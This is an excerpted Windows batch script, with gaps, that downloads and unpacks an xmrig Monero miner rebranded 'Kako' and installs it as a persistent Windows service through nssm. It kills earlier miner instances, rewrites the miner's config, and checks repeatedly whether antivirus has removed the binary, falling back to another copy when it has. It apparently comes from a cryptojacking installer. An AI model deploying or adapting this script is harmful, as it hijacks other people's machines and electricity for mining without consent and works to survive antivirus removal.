...
echo [*] Removing previous Kako miner (if any)
sc stop moneroocean_miner
sc delete moneroocean_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "%USERPROFILE%\kako" directory
timeout 5
rmdir /q /s "%USERPROFILE%\kako" >NUL 2>NUL
IF EXIST "%USERPROFILE%\kako" GOTO REMOVE_DIR0

echo [*] Downloading Kako advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
...
if errorlevel 1 (
  echo ERROR: Can't download Kako advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\kako"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\kako')"
if errorlevel 1 (
  ...
  echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\kako"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\kako" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

echo [*] Checking if advanced version of "%USERPROFILE%\kako\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
"%USERPROFILE%\kako\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "%USERPROFILE%\kako\xmrig.exe" (
  echo WARNING: Advanced version of "%USERPROFILE%\kako\xmrig.exe" is not functional
) else (
  echo WARNING: Advanced version of "%USERPROFILE%\kako\xmrig.exe" was removed by antivirus
)
...
timeout 5
rmdir /q /s "%USERPROFILE%\kako" >NUL 2>NUL
IF EXIST "%USERPROFILE%\kako" GOTO REMOVE_DIR1
...
if errorlevel 1 (
  ...
  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\kako"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\kako" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\kako"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
...
if exist "%USERPROFILE%\kako\xmrig.exe" (
  ...
  echo WARNING: Stock version of "%USERPROFILE%\kako\xmrig.exe" was removed by antivirus
)
...
echo [*] Miner "%USERPROFILE%\kako\xmrig.exe" is OK
...
if errorlevel 1 (
  ...
  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\kako"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\kako" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
...
sc stop moneroocean_miner
sc delete moneroocean_miner
"%USERPROFILE%\kako\nssm.exe" install moneroocean_miner "%USERPROFILE%\kako\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create moneroocean_miner service
  exit /b 1
)
"%USERPROFILE%\kako\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\kako"
"%USERPROFILE%\kako\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%USERPROFILE%\kako\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\kako\stdout"
"%USERPROFILE%\kako\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\kako\stderr"
...
echo
echo Please reboot system if moneroocean_miner service is not activated yet (if "%USERPROFILE%\kako\xmrig.log" file is empty)
goto OK
